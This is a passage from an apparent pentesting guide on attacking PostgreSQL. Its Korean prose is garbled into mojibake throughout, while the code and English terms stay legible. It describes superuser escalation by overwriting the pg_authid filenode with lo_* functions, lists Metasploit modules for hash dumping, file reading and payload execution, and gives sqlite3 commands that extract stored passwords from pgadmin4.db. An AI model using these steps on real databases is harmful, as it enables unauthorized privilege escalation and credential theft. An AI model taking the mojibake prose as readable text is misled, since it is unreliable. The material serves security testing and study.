[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### ë‚´ë¶€ PostgreSQL í…Œì´ë¸” ë®ì–´ì“°ê¸°ë¥¼ í†µí•œ ê¶Œí•œ ìƒìŠ¹

{% hint style="info" %}
ë‹¤ìŒ ê¶Œí•œ ìƒìŠ¹ ë²¡í„°ëŠ” ì œí•œëœ SQLi ì»¨í…ìŠ¤íŠ¸ì—ì„œ íŠ¹íˆ ìœ ìš©í•˜ë©° ëª¨ë“  ë‹¨ê³„ë¥¼ ì¤‘ì²©ëœ SELECT ë¬¸ì„ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ë§Œì•½ **PostgreSQL ì„œë²„ íŒŒì¼ì„ ì½ê³  ì“¸ ìˆ˜ ìˆë‹¤ë©´**, ë‚´ë¶€ `pg_authid` í…Œì´ë¸”ê³¼ ê´€ë ¨ëœ PostgreSQL ì˜¨ë””ìŠ¤í¬ íŒŒì¼ë…¸ë“œë¥¼ ë®ì–´ì“°ëŠ” ê²ƒìœ¼ë¡œ **ìŠˆí¼ìœ ì €ê°€ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

**ì´ ê¸°ìˆ **ì— ëŒ€í•´ ë” ì½ì–´ë³´ì„¸ìš” [**ì—¬ê¸°**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

ê³µê²© ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. PostgreSQL ë°ì´í„° ë””ë ‰í† ë¦¬ íšë“
2. `pg_authid` í…Œì´ë¸”ê³¼ ê´€ë ¨ëœ íŒŒì¼ë…¸ë“œì— ëŒ€í•œ ìƒëŒ€ ê²½ë¡œ íšë“
3. `lo_*` í•¨ìˆ˜ë¥¼ í†µí•´ íŒŒì¼ë…¸ë“œ ë‹¤ìš´ë¡œë“œ
4. `pg_authid` í…Œì´ë¸”ê³¼ ê´€ë ¨ëœ ë°ì´í„° ìœ í˜• íšë“
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)ë¥¼ ì‚¬ìš©í•˜ì—¬ [íŒŒì¼ë…¸ë“œ í¸ì§‘](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); ëª¨ë“  `rol*` ë¶€ìš¸ í”Œë˜ê·¸ë¥¼ 1ë¡œ ì„¤ì •í•˜ì—¬ ì „ì²´ ê¶Œí•œ ë¶€ì—¬
6. `lo_*` í•¨ìˆ˜ë¥¼ í†µí•´ í¸ì§‘ëœ íŒŒì¼ë…¸ë“œ ì¬ì—…ë¡œë“œí•˜ê³  ë””ìŠ¤í¬ì˜ ì›ë³¸ íŒŒì¼ ë®ì–´ì“°ê¸°
7. _(ì„ íƒ ì‚¬í•­)_ ë¹„ìš©ì´ ë§ì´ ë“œëŠ” SQL ì¿¼ë¦¬ë¥¼ ì‹¤í–‰í•˜ì—¬ ì¸ë©”ëª¨ë¦¬ í…Œì´ë¸” ìºì‹œ ì§€ìš°ê¸°
8. ì´ì œ ì „ì²´ ìŠˆí¼ê´€ë¦¬ìì˜ ê¶Œí•œì„ ê°–ê²Œ ë  ê²ƒì…ë‹ˆë‹¤.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### ë¡œê¹…

_**postgresql.conf**_ íŒŒì¼ ë‚´ë¶€ì—ì„œ ë‹¤ìŒì„ ë³€ê²½í•˜ì—¬ postgresql ë¡œê·¸ë¥¼ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
ê·¸ëŸ° ë‹¤ìŒ **ì„œë¹„ìŠ¤ë¥¼ ë‹¤ì‹œ ì‹œì‘**í•˜ì‹­ì‹œì˜¤.

### pgadmin

[pgadmin](https://www.pgadmin.org)ì€ PostgreSQLì„ ìœ„í•œ ê´€ë¦¬ ë° ê°œë°œ í”Œë«í¼ì…ë‹ˆë‹¤.\
_**pgadmin4.db**_ íŒŒì¼ ë‚´ì—ì„œ **ì•”í˜¸**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•´ë‹¹ ì•”í˜¸ëŠ” [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py) ìŠ¤í¬ë¦½íŠ¸ ë‚´ì˜ _**decrypt**_ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

PostgreSQLì—ì„œ í´ë¼ì´ì–¸íŠ¸ ì¸ì¦ì€ **pg\_hba.conf**ë¼ëŠ” êµ¬ì„± íŒŒì¼ì„ í†µí•´ ê´€ë¦¬ë©ë‹ˆë‹¤. ì´ íŒŒì¼ì—ëŠ” ê°ê° ì—°ê²° ìœ í˜•, í´ë¼ì´ì–¸íŠ¸ IP ì£¼ì†Œ ë²”ìœ„ (í•´ë‹¹í•˜ëŠ” ê²½ìš°), ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, ì‚¬ìš©ì ì´ë¦„ ë° ì¼ì¹˜í•˜ëŠ” ì—°ê²°ì— ì‚¬ìš©í•  ì¸ì¦ ë°©ë²•ì„ ì§€ì •í•˜ëŠ” ì¼ë ¨ì˜ ë ˆì½”ë“œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì—°ê²° ìœ í˜•, í´ë¼ì´ì–¸íŠ¸ ì£¼ì†Œ, ìš”ì²­ëœ ë°ì´í„°ë² ì´ìŠ¤ ë° ì‚¬ìš©ì ì´ë¦„ê³¼ ì¼ì¹˜í•˜ëŠ” ì²« ë²ˆì§¸ ë ˆì½”ë“œê°€ ì¸ì¦ì— ì‚¬ìš©ë©ë‹ˆë‹¤. ì¸ì¦ì´ ì‹¤íŒ¨í•˜ë©´ ëŒ€ì²´ ë˜ëŠ” ë°±ì—…ì´ ì—†ìŠµë‹ˆë‹¤. ì¼ì¹˜í•˜ëŠ” ë ˆì½”ë“œê°€ ì—†ìœ¼ë©´ ì•¡ì„¸ìŠ¤ê°€ ê±°ë¶€ë©ë‹ˆë‹¤.

pg\_hba.confì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ì•”í˜¸ ê¸°ë°˜ ì¸ì¦ ë°©ë²•ì€ **md5**, **crypt**, **password**ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ë°©ë²•ì€ ì•”í˜¸ê°€ ì „ì†¡ë˜ëŠ” ë°©ì‹ì— ë”°ë¼ MD5 í•´ì‹±, crypt ì•”í˜¸í™” ë˜ëŠ” ì¼ë°˜ í…ìŠ¤íŠ¸ë¡œ ë‹¤ë¦…ë‹ˆë‹¤. ì¤‘ìš”í•œ ì ì€ crypt ë°©ë²•ì€ pg\_authidì—ì„œ ì•”í˜¸í™”ëœ ì•”í˜¸ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ì—†ë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.
